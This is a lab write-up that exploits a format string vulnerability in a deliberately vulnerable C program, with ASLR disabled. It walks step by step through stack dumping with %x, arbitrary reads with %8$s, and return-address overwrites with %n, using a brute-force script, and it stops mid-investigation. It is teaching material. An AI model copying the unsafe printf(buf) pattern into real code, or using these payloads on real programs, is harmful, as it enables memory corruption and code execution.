### Info
In this lab, we'll try to exploit format string bugs<br/><br/>
**Environment**: Ubuntu 18.04.3 LTS, ASLR disabled<br>
**Keywords**: format string vulnerability

### Implementation
Format string vulnerabilities occur when a user controlled string is passed to the printf like functions (sprintf, snprintf ...)
as the format parameter.
Here is the minimal example code. User input received with `scanf` is directly passed to printf as `printf(buf)`
```
#include <stdio.h>
int authenticate()
{
    char buf[16]={0};
    int pass = 0xaabbccdd;
    
    printf("username:");
    scanf("%15s",buf);
    printf(buf);
    printf(", welcome. password:");
    
    scanf("%x",&pass);
    if(pass == 0xdeadcafe)
    {
        system("/bin/sh");
    }
}
int main(int argc, char **argv)
{
    authenticate();
}
```
Actually when you compile this program, you'll get the warning below regarding vulnerability:
```
fs.c: In function ‘authenticate’:
fs.c:11:12: warning: format not a string literal and no format arguments [-Wformat-security]
     printf(buf);
```
#### Increment 1: Exposing data from stack
A valid printf of usage with format specifier is as the following:
```
printf("Integer value is %d\n" , my_int_var);
```
If you omit the second parameter `my_int_var`, printf dumps the content in the next word after address of format string in stack. On the other hand, if you specify more specifiers than the number or arguments, again printf dumps further data from stack.

Back to our example source code, before `call printf(buf)`, stack of `authenticate` will look like below. The more specifier we pass to the program, the more data we'll expose data from the stack.<br/>
Notice the junk data. The reason for them is for stack alignment required by OS, and hence generated by compiler. The aligment size, alignment layout depends on compiler parameters and versions. We just need to understand that by looking at source code, you can never assume a stack layout, because it's completely based on compiler. Therefore in the below layout, I've added junk data to the every item we're interested. Some of them may or may not exist at all if you rebuild the source file.

``` 
+------------------------+
| address of format str  |
+------------------------+
|  ...  junk data   ...  | 
+------------------------+
| local var: pass        | 
+------------------------+
|  ...  junk data   ...  | 
+------------------------+
| local var: buf[32]     |
+------------------------+
|  ...  junk data   ...  | 
+------------------------+
| prev ebp               |
+------------------------+
| ret addr to main       |
+------------------------+
higher address
```
We expose the data as the following by feeding the input to stdin of process. `;echo` is just added to have a new line after each output. By the way `;` is a seperator to run multiple commands in one line. `<<<` is here operator that feeds a string into the standard input.
```
uzi@pwnpatrol:$ ./fs <<< '%x';echo
username:ffffd530, welcome!
password:
uzi@pwnpatrol:$ ./fs <<< '%x,%x,%x';echo
username:ffffd530,0,5f389700, welcome!
password:
uzi@pwnpatrol:$ ./fs <<< '%x,%x,%x,%x,%x,%x';echo
username:ffffd530,0,ebb27f00,9,ffffd742,f7e184a9, welcome!
password:
uzi@pwnpatrol:$ ./fs <<< '%x,%x,%x,%x,%x,%x,%x,%x,%x';echo
username:ffffd530,0,ea32f300,9,ffffd742,f7e184a9,aabbccdd,252c7825,78252c78, welcome!
password:
``` 
As you see, we dumped several words in stack (some junk, some meaningful). Our local variable `pass` with the initial value `0xaabbccdd` is somewhere around the middle of function stack.
Format strings have an important feature:
* We can specify the nth argument in format string directly. For example `0xaabbccdd` was the 7th word dumbed above. We can dump just it using `%<number>$specifier` syntax:
```
uzi@pwnpatrol:$ ./fs <<< '%7$x'
username:aabbccdd, welcome!
password
```
PS: Notice that I used single qoutes around the argument. If you use double quotes, shell will try to expand $x.

#### Increment 2: Reading a valid address
Let's when we go deeper during dumping, we'll encounter the local buffer storing the format string. For this reason I created a simple signature ABCD and used it in format string. Let's try to dump further expecting to see 0x44434241.
```
uzi@pwnpatrol:$ ./fs <<< 'ABCD%8$x'
username:ABCD44434241, welcome!
password:
```
In the 8th word, I hit the buffer.<br/>
Now you can image that if we write a valid memory address instead of ABCD and use %s format specifier, we can see the content starting with that address till the null byte.
As a target address, we'll read opcodes of main function, let's check them first.
```
uzi@pwnpatrol:$ objdump -Mintel -d fs | grep -A 5 "<main>"
08048556 <main>:
 8048556:       8d 4c 24 04             lea    ecx,[esp+0x4]
 804855a:       83 e4 f0                and    esp,0xfffffff0
```
Now we'll put the address 0x08048556 to the beginning of format string. The easiest way is to use shell feature for escaping bytes using ANSI-C syntax. Below you can observe the opcodes `8d 4c` starting after the bytes of "username:" and 4 bytes of address itself.
```
uzi@pwnpatrol:$ ./fs <<< $'\x56\x85\x04\x08%8$s'
username:V�L$����q�U��Q���J����, welcome!
password:uzi@pwnpatrol:$ ./fs <<< $'\x56\x85\x04\x08%8$s' | xxd -g 1
00000000: 75 73 65 72 6e 61 6d 65 3a 56 85 04 08 8d 4c 24  username:V....L$
00000010: 04 83 e4 f0 ff 71 fc 55 89 e5 51 83 ec 04 e8 4a  .....q.U..Q....J
00000020: ff ff ff b8 2c 20 77 65 6c 63 6f 6d 65 21 0a 70  ...., welcome!.p
00000030: 61 73 73 77 6f 72 64 3a
```
#### Increment 3: Writing to a valid address
The last thing to do is to write to a valid and writable memory region of the process. Let's try to override the return address to libc_start_main. With ASLR disabled, we can easilfy find it with gdb, but the more different tools, techniques we use, the more we'll be experienced. But then, how will we find the address to override?<br/>
As we did above, we'll dump some values from stack and try to guess a range.
```
uzi@pwnpatrol:$ for i in {1..10}; do ./fs "ABCD   %$i\$x"; echo ; done
ABCD   0
ABCD   ffffd600
ABCD   80484bb
ABCD   2
ABCD   ffffd5f4
ABCD   ffffd600
ABCD   deadcafe
ABCD   f7fe59b0
ABCD   ffffd560
```
The values 0xffffd560,0xffffd600 looks like they are addresses from stack, why? They start with 0xffff, they are close to each other.<br/>
We'll run the application many times, and each trial, we'll try to write a dummy value to location 0xffffd550 - 0xffffd610. I selected these values based on samples I've found and added some margin to them. If we hit the return address in one of these attempts, application should get a segmentation fault due to bad $eip address.<br/>
For this purpose, I've created a simple script that generates just the commands because it was really complex to embed it into a shell script. 
```
uzi@pwnpatrol:$ cat cmds.py 
for i in range(0xd500,0xd620,4):
    bytes = i.to_bytes(2,'little')
    print(rf"./fs $'\x{bytes[0]:02x}\x{bytes[1]:02x}\xff\xff   %131$n'")
```
When commands generated I need to run them:
* The simplest and convenient way is to use shell builtin `source`. It basically executes commands from a file in the current shell. It doesn't cause a change in environment variables since it doesn't run the commands within a new shell. The dot operator `.` is same as `source`.
* With the `<(python3 cmds.py)` feature, shell creates a temporary file on the fly and pass its name. So I don't need to create a file manually. Run it, and you'll see output like below.

```
uzi@pwnpatrol:$ . <(python3 cmds.py)
P���   T���   X���   Segmentation fault (core dumped)
����   ����   ���  ���   
...
```
One segmentation fault occured, let's check what happened via `dmesg`.
```
[ 9686.269766] fs[3877]: segfault at 7 ip 0000000000000007 sp 00000000ffffd560 error 14 in fs[8048000+1000]
```
It seems that we succesfully overriden the return address, because $eip is 7. The value of $esp at that moment was 0xffffd560. So we can say that the return address was $esp - 4, that is 0xffffd55c. The 9th value we dumped in stack at the beginning of increment 4 was 0xffffd560. So we can consider a relation between that value and location of return address. Hmm mystery...





